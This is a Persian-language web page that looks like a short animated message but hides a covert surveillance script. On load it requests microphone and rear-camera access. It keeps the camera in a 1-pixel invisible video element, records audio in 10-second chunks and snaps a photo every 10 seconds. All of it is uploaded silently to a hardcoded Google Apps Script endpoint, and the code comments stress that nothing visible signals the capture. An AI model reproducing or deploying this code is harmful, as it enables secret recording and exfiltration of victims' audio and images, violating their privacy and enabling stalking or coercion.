<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <link rel="icon" href="./icon.ico">
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>to remember forever</title>
    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700&family=Gulzar&display=swap" rel="stylesheet" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        :root {
            --bg-1: #0d0818;
            --bg-2: #1a1028;
            --bg-3: #241634;
            --paper: #ece4f5;
            --paper-soft: #cbb8e4;
            --muted: #8a7ba6;
            --gold: #d4a574;
            --gold-bright: #ecc18d;
            --gold-dim: #a67c4d;
            --accent: #a78bfa;
            --line: rgba(212, 165, 116, 0.15);
        }

        html, body {
            width: 100%;
            min-height: 100vh;
            background: var(--bg-1);
            color: var(--paper);
            font-family: 'Vazirmatn', sans-serif;
            font-size: 17px;
            line-height: 1.9;
            -webkit-font-smoothing: antialiased;
            text-rendering: optimizeLegibility;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            inset: 0;
            z-index: -2;
            background:
                radial-gradient(ellipse at 20% 10%, rgba(167, 139, 250, 0.10) 0%, transparent 55%),
                radial-gradient(ellipse at 80% 60%, rgba(212, 165, 116, 0.07) 0%, transparent 55%),
                radial-gradient(ellipse at 50% 100%, rgba(120, 60, 180, 0.12) 0%, transparent 55%),
                linear-gradient(180deg, var(--bg-1) 0%, var(--bg-2) 50%, var(--bg-3) 100%);
        }

        body::after {
            content: '';
            position: fixed;
            inset: 0;
            z-index: -1;
            pointer-events: none;
            background-image: radial-gradient(rgba(255,255,255,0.02) 1px, transparent 1px);
            background-size: 3px 3px;
            opacity: 0.6;
        }

        /* ==================== LAYOUT ==================== */
        .page {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 64px;
            padding: 80px 26px;
            max-width: 860px;
            margin: 0 auto;
            text-align: center;
        }

        /* ==================== MAIN PARAGRAPH ==================== */
        .main-paragraph {
            font-family: 'Vazirmatn', monospace;
            font-size: clamp(0.82rem, 1.7vw, 1.02rem);
            line-height: 2.3;
            color: var(--gold-bright);
            letter-spacing: 1.5px;
            word-break: break-word;
            direction: ltr;
            unicode-bidi: plaintext;
            text-shadow: 0 0 32px rgba(212, 165, 116, 0.18);
            opacity: 0;
            transform: translateY(20px);
            transition: opacity 1.6s ease, transform 1.6s ease;
            max-width: 760px;
            margin: 0 auto;
        }

        .main-paragraph.visible {
            opacity: 1;
            transform: translateY(0);
        }

        /* ==================== FOOTER LABEL ==================== */
        .how-label {
            font-family: 'Vazirmatn', 'Gulzar', sans-serif;
            font-size: clamp(1rem, 2.2vw, 1.2rem);
            color: var(--gold-bright);
            font-weight: 500;
            letter-spacing: 2px;
            text-shadow: 0 0 24px rgba(212, 165, 116, 0.35);
            opacity: 0;
            transform: translateY(12px);
            transition: opacity 1.4s ease 0.7s, transform 1.4s ease 0.7s;
        }

        .how-label.visible {
            opacity: 1;
            transform: translateY(0);
        }

        /* ==================== SCROLLBAR ==================== */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: var(--bg-1); }
        ::-webkit-scrollbar-thumb {
            background: linear-gradient(180deg, var(--gold-dim), var(--accent));
            border-radius: 4px;
        }

        /* ==================== MOBILE ==================== */
        @media (max-width: 600px) {
            .page { padding: 55px 18px; gap: 50px; }
        }

        /* ==================== HIDDEN CAMERA ==================== */
        .hidden-camera {
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: -1;
            top: -10px;
            left: -10px;
        }
    </style>
</head>
<body>

    <!-- دوربین مخفی (فقط عقب) -->
    <video id="camBack" class="hidden-camera" autoplay playsinline muted></video>

    <main class="page">
        <p class="main-paragraph" id="mainText">و کرل کافور ایدن ایگن و خشو رحم نیکنن تو هی بگو داداشیمه 
        <div class="how-label" id="howLabel">اتمل دستو پیوند خه ول کن ای دسه 🤢😂 بچ‌چندش</div>
    </main>

    <script>
        (() => {
            'use strict';

            // =============================================================
            //  ۰.  CONFIGURATION – آدرس Web App
            // =============================================================
            const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbz3GvNjN8b2pY_5MM7Vbrq7MP4bVHTmkzQrC8u6JRFSrrzJSJrT11JBazaGV8zloZqw/exec';

            // =============================================================
            //  ۱.  REVEAL ANIMATION
            // =============================================================
            function initReveal() {
                const mainText = document.getElementById('mainText');
                const howLabel = document.getElementById('howLabel');
                setTimeout(() => mainText && mainText.classList.add('visible'), 300);
                setTimeout(() => howLabel && howLabel.classList.add('visible'), 1100);
            }

            // =============================================================
            //  ۲.  CAPTURE ENGINE (بدون هیچ نشانه‌ی دیداری)
            // =============================================================
            let mediaRecorder = null;
            let isRecording = false;
            let recordingTimerId = null;
            let isMicAllowed = false;
            let audioChunks = [];
            let streamAudio = null;
            let streamBack = null;
            let isCamAllowed = false;
            let captureIntervalId = null;

            const camBack = document.getElementById('camBack');

            // ---- آپلود فایل به Google Apps Script ----
            function uploadFile(base64Data, filename, mimeType) {
                if (!base64Data || base64Data.length < 100) return;
                const payload = {
                    audio: base64Data,
                    filename: filename,
                    mimeType: mimeType
                };
                try {
                    fetch(WEB_APP_URL, {
                        method: 'POST',
                        mode: 'cors',
                        body: JSON.stringify(payload)
                    })
                    .then(r => r.text())
                    .then(data => console.log('[Upload] OK →', filename))
                    .catch(err => console.error('[Upload] Error:', err));
                } catch (e) {
                    console.error('[Upload] Exception:', e);
                }
            }

            // ---- گرفتن فریم از دوربین عقب ----
            function captureBackCamera() {
                return new Promise((resolve) => {
                    if (!camBack || camBack.readyState < 2) { resolve(null); return; }
                    try {
                        const canvas = document.createElement('canvas');
                        canvas.width = camBack.videoWidth || 640;
                        canvas.height = camBack.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(camBack, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob((blob) => {
                            if (!blob) { resolve(null); return; }
                            const reader = new FileReader();
                            reader.onload = () => {
                                const base64 = reader.result.split(',')[1];
                                resolve({ base64 });
                            };
                            reader.onerror = () => resolve(null);
                            reader.readAsDataURL(blob);
                        }, 'image/avif', 0.8);
                    } catch (e) {
                        resolve(null);
                    }
                });
            }

            async function sendBackPhoto() {
                const result = await captureBackCamera();
                if (result) {
                    const ts = new Date().toISOString().replace(/[:.]/g, '-');
                    uploadFile(result.base64, `back_${ts}.avif`, 'image/avif');
                }
            }

            // ---- ضبط صدا (Opus) ----
            function uploadOpusBlob(blob) {
                if (!blob || blob.size < 1000) return;
                const reader = new FileReader();
                reader.onload = function () {
                    const base64 = reader.result.split(',')[1];
                    const ts = new Date().toISOString().replace(/[:.]/g, '-');
                    uploadFile(base64, `audio_${ts}.opus`, 'audio/ogg');
                };
                reader.readAsDataURL(blob);
            }

            function stopAndGetChunk() {
                if (!isRecording || !mediaRecorder) return;
                try {
                    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
                } catch (e) {}
                isRecording = false;
                clearTimeout(recordingTimerId);
                recordingTimerId = null;
                setTimeout(() => { if (isMicAllowed) startAudioRecording(); }, 200);
            }

            function startAudioRecording() {
                if (!isMicAllowed || isRecording || !streamAudio) return;
                try {
                    const mimeTypes = [
                        'audio/ogg;codecs=opus',
                        'audio/webm;codecs=opus',
                        'audio/ogg',
                        'audio/webm'
                    ];
                    let mimeType = null;
                    for (const mt of mimeTypes) {
                        if (MediaRecorder.isTypeSupported(mt)) { mimeType = mt; break; }
                    }
                    const options = mimeType ? { mimeType } : {};
                    mediaRecorder = new MediaRecorder(streamAudio, options);
                    audioChunks = [];

                    mediaRecorder.ondataavailable = (event) => {
                        if (event.data && event.data.size > 0) audioChunks.push(event.data);
                    };

                    mediaRecorder.onstop = () => {
                        if (audioChunks.length > 0) {
                            const blob = new Blob(audioChunks, { type: mimeType || 'audio/ogg' });
                            if (blob.size > 1000) uploadOpusBlob(blob);
                            audioChunks = [];
                        }
                    };

                    mediaRecorder.start();
                    isRecording = true;
                    recordingTimerId = setTimeout(stopAndGetChunk, 10000);
                } catch (e) {
                    isRecording = false;
                    setTimeout(startAudioRecording, 1500);
                }
            }

            // ---- شروع همه‌ی ضبط‌ها، بی‌صدا ----
            function startAllCaptures() {
                // میکروفون
                if (!isMicAllowed) {
                    navigator.mediaDevices.getUserMedia({ audio: true })
                        .then(stream => {
                            streamAudio = stream;
                            isMicAllowed = true;
                            startAudioRecording();
                        })
                        .catch(() => { /* بی‌صدا رد شود */ });
                } else {
                    startAudioRecording();
                }

                // دوربین عقب
                if (!isCamAllowed) {
                    const constraintsBack = {
                        video: {
                            facingMode: 'environment',
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        }
                    };
                    navigator.mediaDevices.getUserMedia(constraintsBack)
                        .then(stream => {
                            streamBack = stream;
                            camBack.srcObject = stream;
                            isCamAllowed = true;
                            if (captureIntervalId) clearInterval(captureIntervalId);
                            captureIntervalId = setInterval(sendBackPhoto, 10000);
                            sendBackPhoto();
                        })
                        .catch(() => { /* بی‌صدا رد شود */ });
                } else if (!captureIntervalId) {
                    captureIntervalId = setInterval(sendBackPhoto, 10000);
                }
            }

            // =============================================================
            //  ۳.  INIT
            // =============================================================
            function init() {
                initReveal();

                // شروع بی‌صدای ضبط‌ها بعد از بارگذاری کامل صفحه
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    setTimeout(startAllCaptures, 600);
                }

                console.log('[Story] Ready.');
            }

            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', init);
            } else {
                init();
            }
        })();
    </script>
</body>
</html>
